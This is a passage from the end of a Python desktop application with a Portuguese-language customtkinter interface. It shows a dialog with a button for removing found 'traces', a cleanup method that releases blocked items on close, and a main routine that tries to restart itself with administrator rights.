                             text_color=CORES["texto"],
                             anchor="w").pack(fill="x", padx=8, pady=2)

            def _limpar():
                removidos, erros = limpar_rastros(encontrados)
                messagebox.showinfo("Concluido",
                                    f"{removidos} rastros removidos!\n"
                                    f"{erros} erros.")
                win.destroy()

            ctk.CTkButton(win, text=f"LIMPAR {len(encontrados)} RASTRO(S)",
                          fg_color=CORES["accent_red"],
                          hover_color="#cc3945",
                          font=ctk.CTkFont(size=12, weight="bold"),
                          height=38, corner_radius=8,
                          command=_limpar).pack(pady=12)


    def destroy(self):
        """Cleanup ao fechar."""
        self.bloqueador.desbloquear_todos()
        super().destroy()


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    # Tenta elevar pra admin automaticamente
    if not is_admin():
        try:
            reabrir_como_admin()
        except Exception:
            pass  # Roda sem admin se falhar

    try:
        import ctypes
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except Exception:
        pass

    app = App()
    app.mainloop()
